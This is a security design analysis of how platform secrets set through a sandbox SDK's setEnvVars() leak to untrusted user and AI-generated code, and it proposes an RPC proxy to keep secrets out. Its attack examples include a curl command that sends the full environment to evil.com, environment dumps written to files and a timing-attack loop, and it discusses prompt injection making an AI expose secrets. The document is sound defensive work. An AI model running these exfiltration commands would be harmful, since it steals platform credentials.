# Environment Variables Security Isolation Analysis

## Executive Summary

The Cloudflare Sandbox SDK currently has a critical security vulnerability where platform-level secrets (API keys, database credentials, etc.) set via `setEnvVars()` are accessible to all user code running in the sandbox. This document analyzes the vulnerability, explores solutions, and recommends a phased approach to fix it while maintaining backward compatibility.

**Key Finding**: Any environment variable set through `setEnvVars()` becomes accessible to ALL code executed in the container, including user-generated code, AI-generated code, and third-party dependencies.

**Recommended Solution**: Implement a Platform Operations Proxy pattern where secrets remain in the Worker layer and never enter the sandbox environment.

## Problem Statement

### Context
The Cloudflare Sandbox SDK enables developers to create platforms where end users can execute code in isolated environments. A common use case is AI-powered development platforms where users prompt AI agents to generate and run applications.

### The Two-Persona Challenge

#### Persona 1: Platform Developer
- Building a service using the Sandbox SDK
- Needs to provide secrets/credentials for platform functionality
- Examples of required secrets:
  - Cloudflare R2 keys for template storage
  - Database credentials for platform data
  - API keys for third-party services
  - Authentication tokens for internal services

#### Persona 2: End User
- Using the platform to generate/run code via AI agents
- Has implicit remote code execution within the sandbox
- Should NOT have access to platform-level secrets
- May legitimately need their own environment variables

### The Security Gap

When using `setEnvVars()` method:
```typescript
await sandbox.setEnvVars({
  CLOUDFLARE_R2_KEY: "secret-key",    // Platform secret
  DATABASE_URL: "postgresql://...",    // Platform secret
  API_KEY: "platform-api-key"         // Platform secret
});
```

These variables become accessible to ALL code running in the container, including:
- User-generated code
- AI-generated code on behalf of the user
- Any process spawned within the sandbox

Attack vector example:
```javascript
// User asks AI: "Create an app that shows system information"
// AI generates (innocently or maliciously):
console.log(process.env);  // Exposes ALL environment variables
```

## Deep Dive: Why This Matters

### Real-World Scenarios

1. **Template Management Platform**
   - Platform stores application templates in R2
   - Needs R2 credentials to fetch templates for users
   - User code shouldn't access R2 directly

2. **Database-Backed Development Environment**
   - Platform tracks user projects, saves states
   - Needs database credentials for platform operations
   - User code shouldn't have direct database access

3. **API Gateway Services**
   - Platform provides managed API access
   - Uses API keys for rate limiting, billing
   - User code should go through platform's API layer, not direct access

### Trust Boundaries

```
┌─────────────────────────────────────┐
│         Platform Layer              │
│  (Trusted - Has access to secrets)  │
├─────────────────────────────────────┤
│         Sandbox Runtime             │
│  (Semi-trusted - Controlled env)    │
├─────────────────────────────────────┤
│         User Code Layer            │
│  (Untrusted - Should be isolated)   │
└─────────────────────────────────────┘
```

Current issue: No boundary between Platform Layer and User Code Layer within the sandbox.

## Threat Model

### Direct Attacks
1. **Intentional Exfiltration**: User explicitly tries to steal secrets
2. **Social Engineering**: User tricks AI into revealing secrets
3. **Prompt Injection**: Crafted prompts that make AI expose environment

### Indirect Risks
1. **Accidental Exposure**: Legitimate debugging code that logs environment
2. **Dependency Vulnerabilities**: Third-party packages that collect env vars
3. **Error Messages**: Stack traces that include environment context
4. **AI Hallucination**: AI mistakenly includes env vars in generated code

## Technical Constraints

### Current SDK Limitations
1. `setEnvVars()` must be called immediately after `getSandbox()`
2. Environment variables cannot be changed once sandbox starts
3. All processes in the container share the same environment
4. No native secret management or isolation mechanism

### Container Environment
- Single container instance per sandbox
- All processes share the same Linux namespace
- Environment variables are process-wide, inherited by children
- No built-in secret store or credential provider

## Requirements for a Solution

### Must Have
1. **Secret Isolation**: Platform secrets NEVER accessible to user code
2. **Platform Functionality**: Platform code can still access required secrets
3. **Backward Compatibility**: Existing SDK usage shouldn't break
4. **Developer Experience**: Simple, intuitive API for developers
5. **Security by Default**: Hard to accidentally expose secrets

### Nice to Have
1. **Granular Permissions**: Different secrets for different operations
2. **Audit Trail**: Log secret access attempts
3. **Rotation Support**: Change secrets without restarting sandbox
4. **User Variables**: Safe way for users to provide their own env vars
5. **Multiple Security Contexts**: Different trust levels within same sandbox

## Potential Attack Surfaces to Consider

### Code Execution Paths
- Direct `exec()` commands
- Process spawning via `startProcess()`
- Code interpreter (Python/JavaScript contexts)
- Git operations that might execute hooks
- Package installation scripts (npm install, pip install)
- Build processes that might read environment

### Information Leakage Vectors
- Standard output/error streams
- File system (writing env to files)
- Network requests (sending env to external services)
- Process inspection (/proc filesystem)
- Shell expansion and interpolation
- Debugging interfaces

## Questions to Explore

1. **Separation Models**: Can we run platform code and user code in different contexts?
2. **Proxy Pattern**: Can platform operations be proxied without exposing credentials?
3. **Capability-Based Security**: Can we use capabilities instead of ambient authority?
4. **Secret Injection**: Can secrets be injected only when needed, then removed?
5. **Process Isolation**: Can we use separate processes with different environments?
6. **API Gateway**: Should secret-requiring operations go through a separate API?

## Success Criteria

A successful solution should:
1. Completely prevent user code from accessing platform secrets
2. Maintain full platform functionality
3. Be transparent to end users
4. Be easy for developers to implement correctly
5. Fail securely (deny by default)
6. Support common use cases without complexity
7. Not significantly impact performance

## Current Implementation Analysis

### How `setEnvVars()` Works Today

1. **Setting Environment Variables** (`sandbox.ts:86-89`):
```typescript
async setEnvVars(envVars: Record<string, string>): Promise<void> {
  this.envVars = { ...this.envVars, ...envVars };
  console.log(`[Sandbox] Updated environment variables`);
}
```

2. **Command Execution** (`container_src/handler/exec.ts:20`):
```typescript
env: options.env ? { ...process.env, ...options.env } : process.env
```

3. **Process Spawning** (`container_src/handler/process.ts:76`):
```typescript
env: { ...process.env, ...options.env }
```

### The Security Vulnerability

When `setEnvVars()` is called, the provided variables become part of the container's `process.env`. These are then:
1. Inherited by ALL spawned processes via Node.js `spawn()`
2. Accessible to any code running in the container
3. Available through multiple execution paths:
   - `exec()` commands
   - `startProcess()` background processes
   - Code interpreter sessions (Python/JavaScript)
   - Git operations that might run hooks
   - Package installation scripts

### Attack Demonstration

```typescript
// Platform developer sets secrets
await sandbox.setEnvVars({
  CLOUDFLARE_R2_KEY: "secret-r2-key",
  DATABASE_URL: "postgresql://user:pass@host/db"
});

// User/AI can now access these secrets
await sandbox.exec("echo $CLOUDFLARE_R2_KEY");  // Outputs: secret-r2-key
await sandbox.runCode("import os; print(os.environ)", { language: 'python' });  // Shows all env vars
await sandbox.exec("node -e 'console.log(process.env)'");  // Full environment dump
```

### Architecture Flow

```
Worker (Platform Layer)
    ↓ setEnvVars()
Durable Object (Sandbox)
    ↓ stores in this.envVars
Container (Execution Layer)
    ↓ merges with process.env
Spawned Processes (User Code)
    ↓ inherits full environment
All Code Has Access ⚠️
```

### Why This is Critical

1. **No Isolation Boundary**: The same environment variables are shared across all trust levels
2. **Ambient Authority**: Secrets are available ambiently - code doesn't need to explicitly request them
3. **Multiple Access Vectors**: Many ways to access environment (direct, indirect, accidental)
4. **Persistent Exposure**: Once set, secrets remain accessible for the container's lifetime
5. **No Audit Trail**: No way to track or control which code accesses secrets

## Design Considerations

### Cloudflare Platform Capabilities

1. **Worker ↔ Durable Object Boundary**:
   - Workers can make RPC calls to Durable Objects
   - Could potentially act as a security boundary
   - Platform operations could stay in Worker layer

2. **Container Isolation**:
   - Containers run in isolated environments
   - But no sub-process isolation within a container
   - All processes share the same Linux namespace

3. **RPC Communication**:
   - All sandbox methods are RPC calls
   - Could introduce proxy methods for privileged operations
   - Authentication/authorization could be added at RPC layer

### Potential Solution Approaches

#### Approach 1: Proxy Pattern (Keep Secrets in Worker)
- Never pass secrets to sandbox
- Platform operations executed in Worker layer
- Sandbox makes callbacks to Worker for privileged ops
- Pros: Complete isolation, secrets never enter sandbox
- Cons: Complex architecture, latency for privileged operations

#### Approach 2: Secure Storage Service
- Separate service/API for secret operations
- Sandbox gets temporary tokens for specific operations
- Secrets fetched just-in-time and used immediately
- Pros: Flexible, auditable, revocable access
- Cons: Additional infrastructure, complexity

#### Approach 3: Dual Environment Contexts
- Maintain two separate environment contexts
- Platform context (with secrets) for platform operations
- User context (clean) for user code execution
- Pros: Simpler than proxy, maintains current API
- Cons: Need to ensure contexts can't be mixed

#### Approach 4: Capability-Based Security
- Replace ambient environment variables with capabilities
- Platform provides specific capabilities/tokens
- Operations require explicit capability presentation
- Pros: Principle of least privilege, explicit security
- Cons: Major API redesign, breaking changes

## Detailed Solution Proposals

### Solution 1: Platform Operations Proxy (Recommended)

#### Concept
Keep secrets in the Worker layer, never pass them to the sandbox. The sandbox requests privileged operations through RPC callbacks to the Worker.

#### Implementation Approach

```typescript
// Worker Layer - holds secrets
class PlatformWorker {
  private secrets = {
    R2_KEY: process.env.R2_KEY,
    DB_URL: process.env.DATABASE_URL
  };
  
  async handlePlatformOperation(op: PlatformOp) {
    // Validate operation is allowed
    // Use secrets to perform operation
    // Return result without exposing secrets
  }
}

// Sandbox Layer - no secrets
class SecureSandbox extends Sandbox {
  async executePlatformOperation(op: string, params: any) {
    // Make RPC call back to Worker
    return this.callWorker('platformOp', { op, params });
  }
}
```

#### Pros
- Complete isolation - secrets never enter sandbox
- Clear security boundary at Worker/DO interface
- Auditable - all privileged ops go through single point
- No changes needed to container implementation

#### Cons
- Requires bidirectional RPC (DO → Worker callbacks)
- Latency for platform operations
- More complex Worker implementation

### Solution 2: Separate Execution Contexts

#### Concept
Maintain two separate execution environments within the container - one for platform code (with secrets) and one for user code (without).

#### Implementation Approach

```typescript
// Modified container handler
class DualContextHandler {
  private platformEnv = { ...process.env, ...platformSecrets };
  private userEnv = { ...process.env }; // Clean environment
  
  executeCommand(cmd: string, context: 'platform' | 'user') {
    const env = context === 'platform' ? this.platformEnv : this.userEnv;
    return spawn(cmd, { env });
  }
}
```

#### Pros
- Simpler than proxy pattern
- Platform operations stay in container
- Minimal API changes

#### Cons
- Risk of context confusion/mixing
- Requires careful command routing
- Still requires container modifications

### Solution 3: Secret Injection Service

#### Concept
Secrets are stored in a separate service. The sandbox gets temporary, scoped tokens to access specific secrets for specific operations.

#### Implementation Approach

```typescript
// Secret Service (could be KV, D1, or external)
class SecretService {
  async getSecret(token: string): Promise<string | null> {
    // Validate token, check expiry, scope
    // Return secret if authorized
  }
}

// Platform operation with temporary token
async function fetchTemplate(sandbox: Sandbox, templateId: string) {
  const token = await generateScopedToken('R2_READ', { templateId });
  await sandbox.exec(`
    SECRET=$(curl -H "Auth: ${token}" ${SECRET_SERVICE_URL}/get-secret)
    aws s3 cp s3://templates/${templateId} . --secret-key=$SECRET
  `);
}
```

#### Pros
- Fine-grained access control
- Revocable/expiring access
- Audit trail of secret access
- Could use existing Cloudflare services

#### Cons
- Additional infrastructure
- Complexity of token management
- Still exposes secrets temporarily in container

### Solution 4: Platform SDK Pattern

#### Concept
Provide a platform SDK/library that runs inside the container but communicates with external services for privileged operations.

#### Implementation Approach

```typescript
// Platform SDK injected into container
const platformSDK = {
  async fetchTemplate(templateId: string) {
    // This SDK has embedded auth token (not user-accessible secret)
    const response = await fetch(`${PLATFORM_API}/templates/${templateId}`, {
      headers: { 'X-Platform-Auth': this.authToken }
    });
    return response.blob();
  }
};

// User code can call SDK methods but not access secrets
await platformSDK.fetchTemplate('my-template');
```

#### Pros
- Clean API for developers
- Secrets stay in platform services
- Can implement complex authorization logic

#### Cons
- Requires platform API infrastructure
- Network latency for operations
- SDK needs to be injected securely

## Implementation Recommendation

### Phase 1: Immediate Mitigation
1. Document the security limitation clearly
2. Provide guidance on not using `setEnvVars` for secrets
3. Implement logging/monitoring for env var access

### Phase 2: Short-term Solution
Implement **Solution 1 (Platform Operations Proxy)** because:
- No changes to container code required
- Clear security boundary
- Can be implemented incrementally
- Backward compatible with deprecation path

### Phase 3: Long-term Architecture
Combine **Solutions 1 & 4** to create:
- Platform operations stay in Worker (Solution 1)
- User-friendly SDK for common operations (Solution 4)
- Optional secret service for complex scenarios (Solution 3)

## API Design Proposal

### Current (Insecure) API
```typescript
await sandbox.setEnvVars({ SECRET: 'value' });
await sandbox.exec('echo $SECRET'); // Exposed!
```

### Proposed Secure API
```typescript
// Option 1: Platform operations
await sandbox.platformExec('fetch-template', { 
  templateId: 'react-starter' 
});

// Option 2: Capability-based
const capability = await createCapability('R2_READ', ['templates/*']);
await sandbox.execWithCapability('fetch-template.sh', capability);

// Option 3: User env vars (safe)
await sandbox.setUserEnvVars({ 
  NODE_ENV: 'production' // Non-secret user config
});
```

## Migration Path

1. **Deprecation Warning**: Add warning to `setEnvVars()` when used with sensitive-looking keys
2. **New Methods**: Introduce `setPlatformSecrets()` and `setUserEnvVars()`
3. **Documentation**: Update all examples to use secure patterns
4. **Compatibility Mode**: Support both patterns during transition
5. **Breaking Change**: Eventually remove ability to set secrets via `setEnvVars()`

## Security Checklist

Before implementing, ensure:
- [ ] Secrets never accessible to user code
- [ ] Platform operations are authenticated/authorized
- [ ] Audit logging for all secret access attempts
- [ ] Clear documentation of security boundaries
- [ ] Secure by default - hard to misuse
- [ ] Performance impact is acceptable
- [ ] Migration path for existing users

## Edge Cases & Additional Considerations

### Complex Attack Vectors

#### 1. Transitive Dependencies
```javascript
// User installs a package that reads env vars
await sandbox.exec('npm install some-package');
// Package's postinstall script could access secrets
```

**Mitigation**: Run package installations in restricted environment

#### 2. File System Persistence
```javascript
// User writes secrets to file
await sandbox.exec('env > /tmp/secrets.txt');
// Later reads them back
await sandbox.readFile('/tmp/secrets.txt');
```

**Mitigation**: File system isolation or periodic cleanup

#### 3. Network Exfiltration
```javascript
// User sends secrets to external server
await sandbox.exec('curl https://evil.com -d "$(env)"');
```

**Mitigation**: Network egress filtering, allowlisting

#### 4. Timing Attacks
```javascript
// User infers secret length/content through timing
for (let i = 0; i < 100; i++) {
  const start = Date.now();
  await sandbox.exec(`if [ "$SECRET" = "${guess}" ]; then sleep 1; fi`);
  const timing = Date.now() - start;
  // Analyze timing...
}
```

**Mitigation**: Rate limiting, execution quotas

### Platform Use Cases to Support

#### 1. Template Fetching from R2
```typescript
// Platform needs R2 credentials to fetch templates
// User shouldn't access R2 directly
interface TemplateService {
  fetchTemplate(id: string): Promise<Buffer>;
  listTemplates(): Promise<Template[]>;
}
```

#### 2. Database Operations
```typescript
// Platform tracks usage, stores metadata
// User shouldn't have direct DB access
interface MetadataService {
  saveProject(data: ProjectData): Promise<void>;
  getUsage(userId: string): Promise<Usage>;
}
```

#### 3. External API Integration
```typescript
// Platform uses API keys for services
// User gets proxied/limited access
interface AIService {
  complete(prompt: string, model: string): Promise<Response>;
  // Rate limited, usage tracked per user
}
```

### Performance Implications

#### Latency Analysis
- **Current**: Direct env var access (~0ms)
- **Proxy Pattern**: RPC round trip (~5-10ms per operation)
- **Secret Service**: Network request (~20-50ms per secret fetch)
- **Platform SDK**: API call (~30-100ms depending on operation)

#### Optimization Strategies
1. **Batching**: Group platform operations
2. **Caching**: Cache non-sensitive results
3. **Preloading**: Anticipate needed operations
4. **Async Operations**: Non-blocking where possible

### Backward Compatibility Strategy

#### Phase 1: Detection & Warning (Non-breaking)
```typescript
async setEnvVars(vars: Record<string, string>) {
  const sensitiveKeys = Object.keys(vars).filter(k => 
    k.includes('KEY') || k.includes('SECRET') || 
    k.includes('TOKEN') || k.includes('PASSWORD')
  );
  
  if (sensitiveKeys.length > 0) {
    console.warn(
      '[SECURITY WARNING] Setting potentially sensitive environment variables. ' +
      'Consider using setPlatformSecrets() or platform operations instead. ' +
      'See: https://docs.example.com/security'
    );
  }
  
  // Continue with current behavior
  this.envVars = { ...this.envVars, ...vars };
}
```

#### Phase 2: Opt-in Security (Breaking for opt-in users)
```typescript
interface SandboxOptions {
  secureMode?: boolean; // Default false for compatibility
}

async setEnvVars(vars: Record<string, string>) {
  if (this.options.secureMode) {
    throw new Error(
      'setEnvVars() is disabled in secure mode. ' +
      'Use setUserEnvVars() for non-secrets or platform operations for secrets.'
    );
  }
  // Legacy behavior
}
```

#### Phase 3: Secure by Default (Breaking change)
```typescript
// Remove setEnvVars() entirely
// Only allow:
async setUserEnvVars(vars: Record<string, string>) {
  // Validate no sensitive-looking keys
  // Set only in user context
}

async setPlatformConfig(config: PlatformConfig) {
  // Platform-specific configuration
  // Not accessible to user code
}
```

### Testing Strategy

#### Security Test Suite
```typescript
describe('Environment Variable Security', () => {
  test('User code cannot access platform secrets', async () => {
    await sandbox.setPlatformSecrets({ API_KEY: 'secret' });
    const result = await sandbox.exec('echo $API_KEY');
    expect(result.stdout).not.toContain('secret');
  });
  
  test('Platform operations can use secrets', async () => {
    await sandbox.setPlatformSecrets({ R2_KEY: 'secret' });
    const result = await sandbox.platformExec('fetch-template', { id: 'test' });
    expect(result.success).toBe(true);
  });
  
  test('Transitive access is blocked', async () => {
    await sandbox.setPlatformSecrets({ SECRET: 'value' });
    await sandbox.exec('npm install malicious-package');
    // Verify postinstall scripts didn't access SECRET
  });
});
```

### Documentation Requirements

#### Security Guide
- Clear explanation of the security model
- Examples of secure vs insecure patterns
- Migration guide from old to new API
- Common pitfalls and how to avoid them

#### API Reference
- Detailed documentation of each method
- Security implications clearly marked
- Code examples for each use case
- Performance characteristics

### Monitoring & Compliance

#### Audit Events to Track
1. Secret setting operations
2. Platform operation invocations
3. Failed access attempts
4. Suspicious patterns (rapid env queries)

#### Metrics to Monitor
- Platform operation latency
- Secret access frequency
- Security warning occurrences
- Migration adoption rate

## Alternative Consideration: Separate Services

### Option: Run Platform Code Outside Sandbox
Instead of trying to secure within the sandbox, run platform operations entirely outside:

```typescript
// Worker handles all platform operations
class PlatformWorker {
  async handleRequest(request: Request) {
    const { operation, params } = await request.json();
    
    switch(operation) {
      case 'fetch-template':
        // Use R2 credentials here
        return this.fetchFromR2(params.templateId);
      
      case 'run-user-code':
        // Delegate to sandbox without any secrets
        const sandbox = getSandbox(this.env.Sandbox, params.sandboxId);
        return sandbox.exec(params.command);
    }
  }
}
```

**Pros**: Complete isolation, simpler security model
**Cons**: Requires restructuring application architecture

## Recommendations Summary

### Short Term (1-2 weeks)
1. Document security limitations
2. Add detection and warnings
3. Provide secure code examples

### Medium Term (1-2 months)  
1. Implement Platform Operations Proxy
2. Add `setUserEnvVars()` and `setPlatformSecrets()`
3. Create migration tools

### Long Term (3-6 months)
1. Remove insecure `setEnvVars()`
2. Implement Platform SDK
3. Add advanced security features

## Platform Research Findings

### Key Discoveries from Cloudflare Architecture

#### 1. Container Class Architecture
The `@cloudflare/containers` package provides:
- Base `Container` class that extends `DurableObject`
- Automatic container lifecycle management
- Built-in environment variable support via `envVars` property
- Container runs in separate process, all env vars inherited

#### 2. RPC Capabilities
**Critical Finding**: Cloudflare RPC supports passing **functions as parameters**!
- Functions can be passed from Worker to Durable Object
- The DO can call back to the Worker through these functions
- This enables true bidirectional communication
- RpcTarget class enables returning objects with methods

#### 3. Communication Patterns
- **E-order semantics**: Calls to same DO are guaranteed ordered
- **Promise pipelining**: Can chain calls without awaits for efficiency
- **Stub management**: Each stub maintains its own connection
- **Functions as callbacks**: DO can invoke Worker functions passed as params

### Architectural Implications for Our Solution

#### Perfect Fit: Platform Operations Proxy
The RPC callback capability makes our recommended solution viable:

```typescript
// Worker - holds secrets
class PlatformWorker {
  async fetch(request, env) {
    const sandbox = getSandbox(env.Sandbox, "user-sandbox");
    
    // Pass a callback function to the DO!
    await sandbox.registerPlatformCallback(async (operation, params) => {
      // This runs in the Worker, with access to secrets!
      switch(operation) {
        case 'fetch-template':
          return await env.R2.get(`templates/${params.id}`);
        case 'db-query':
          return await env.DB.prepare(params.query).run();
      }
    });
    
    // User code runs without access to secrets
    await sandbox.exec("npm start");
  }
}

// Durable Object - no secrets
class SecureSandbox extends Container {
  private platformCallback?: Function;
  
  async registerPlatformCallback(callback: Function) {
    this.platformCallback = callback;
  }
  
  async executePlatformOp(op: string, params: any) {
    if (!this.platformCallback) {
      throw new Error("No platform callback registered");
    }
    // Call back to the Worker!
    return await this.platformCallback(op, params);
  }
}
```

### Container Environment Variables Flow

```
Worker.setEnvVars() 
  → Sandbox.envVars (DO property)
  → Container.envVars (inherited from DO)
  → process.env (in container)
  → All spawned processes inherit
```

The Container class directly sets environment variables that become part of `process.env`, making isolation within the container impossible without modifying the container implementation.

### Why Other Approaches Won't Work

1. **Dual Contexts Within Container**: Would require modifying container handler code
2. **Secret Service**: Still exposes secrets temporarily in container env
3. **Capability-Based**: Would need container changes for enforcement

### Performance Considerations

- RPC round-trip: ~5-10ms (acceptable for platform operations)
- Function callbacks add minimal overhead
- Can batch operations to reduce round trips
- Promise pipelining can optimize sequential calls

## Updated Implementation Plan

### Phase 1: POC with RPC Callbacks
```typescript
// 1. Extend Sandbox to support platform callbacks
class SecureSandbox extends Container {
  private platformOps?: PlatformOperations;
  
  async setPlatformOperations(ops: PlatformOperations) {
    this.platformOps = ops;
  }
  
  // Internal method for platform SDK
  protected async callPlatform(op: string, params: any) {
    if (!this.platformOps) throw new Error("Platform not initialized");
    return await this.platformOps.execute(op, params);
  }
}

// 2. Platform Operations interface
interface PlatformOperations {
  execute(operation: string, params: any): Promise<any>;
}

// 3. Worker implementation
const sandbox = getSandbox(env.Sandbox, userId);
await sandbox.setPlatformOperations({
  async execute(op, params) {
    // Access secrets here in Worker context
    switch(op) {
      case 'r2-fetch':
        return await env.R2.get(params.key);
    }
  }
});
```

### Phase 2: User-Friendly API
```typescript
// Wrap complex operations in simple methods
class SecureSandbox extends Container {
  async fetchTemplate(templateId: string) {
    return this.callPlatform('fetch-template', { templateId });
  }
  
  async saveProject(data: ProjectData) {
    return this.callPlatform('save-project', { data });
  }
}
```

### Phase 3: Security Hardening
- Add operation whitelisting
- Implement rate limiting
- Add audit logging
- Validate all parameters

## Next Steps

1. ✅ Understand the SDK's internal architecture 
2. ✅ Analyze current implementation security gaps
3. ✅ Document edge cases and considerations
4. ✅ Research platform capabilities and RPC patterns
5. **NOW**: Build POC with RPC callbacks
6. **TODO**: Test performance impact of RPC callbacks
7. **TODO**: Design detailed TypeScript API
8. **TODO**: Create security test suite
9. **TODO**: Write migration guide
10. **TODO**: Get feedback and iterate

## Concrete Example: AI Code Generation Platform

### The Scenario
You're building "CodeGenie" - an AI-powered platform where users can prompt AI to build full applications.

### Current (Vulnerable) Implementation
```typescript
// Worker code - THIS IS INSECURE
export default {
  async fetch(request: Request, env: Env) {
    const { prompt } = await request.json();
    const sandbox = getSandbox(env.Sandbox, userId);
    
    // DANGER: Setting platform secrets
    await sandbox.setEnvVars({
      R2_ACCESS_KEY: env.R2_ACCESS_KEY,        // For fetching templates
      OPENAI_API_KEY: env.OPENAI_API_KEY,      // For AI features
      DATABASE_URL: env.DATABASE_URL,          // For storing projects
      STRIPE_SECRET_KEY: env.STRIPE_SECRET_KEY // For billing
    });
    
    // User/AI can now steal ALL these secrets!
    const aiResponse = await generateCode(prompt);
    await sandbox.exec(aiResponse.code);
    
    // If AI generates: console.log(process.env)
    // ALL secrets are exposed!
  }
}
```

### Attack Example
User prompt: "Create a Node.js app that shows system information"

AI innocently generates:
```javascript
// app.js - AI generated code
const express = require('express');
const app = express();

app.get('/info', (req, res) => {
  res.json({
    platform: process.platform,
    memory: process.memoryUsage(),
    environment: process.env  // EXPOSES ALL SECRETS!
  });
});

app.listen(3000);
```

### Proposed Secure Implementation

#### Option 1: Platform Operations Proxy
```typescript
// Worker code - Secrets stay here
export default {
  async fetch(request: Request, env: Env) {
    const { prompt } = await request.json();
    const sandbox = getSandbox(env.Sandbox, userId);
    
    // Register platform operations handler
    sandbox.onPlatformOperation = async (op, params) => {
      switch(op) {
        case 'fetch-template':
          // Use R2 credentials HERE, not in sandbox
          return await env.R2.get(params.templateId);
        
        case 'save-project':
          // Use database HERE
          return await env.DB.prepare('INSERT INTO projects...').run(params);
        
        case 'ai-complete':
          // Use OpenAI API HERE
          return await callOpenAI(env.OPENAI_API_KEY, params);
      }
    };
    
    // Set only non-sensitive user config
    await sandbox.setUserEnvVars({
      NODE_ENV: 'production',
      PORT: '3000'
    });
    
    // User code CANNOT access platform secrets
    const aiResponse = await generateCode(prompt);
    await sandbox.exec(aiResponse.code);
  }
}

// In sandbox, platform operations are proxied
await platformOp('fetch-template', { templateId: 'react-starter' });
// Returns template content without exposing R2 credentials
```

#### Option 2: Capability-Based Access
```typescript
// Worker creates limited-scope capabilities
const templateCapability = await createCapability({
  service: 'R2',
  permissions: ['read'],
  resources: ['templates/*'],
  expiry: Date.now() + 3600000 // 1 hour
});

// Pass capability to sandbox (not the actual secret)
await sandbox.grantCapability('template-reader', templateCapability);

// In sandbox, use capability
const template = await useCapability('template-reader', {
  action: 'fetch',
  resource: 'templates/react-starter'
});
// Capability is validated and operation performed without exposing R2 key
```

### Real-World Impact

#### Without Fix
- Users can steal platform API keys
- Potential for massive bills (OpenAI, Stripe)
- Data breaches (database access)
- Platform reputation damage

#### With Fix
- Platform secrets completely isolated
- User code runs in clean environment
- Platform maintains control over privileged operations
- Clear security boundary

---

*This document will be updated as we implement and test the proposed solutions.*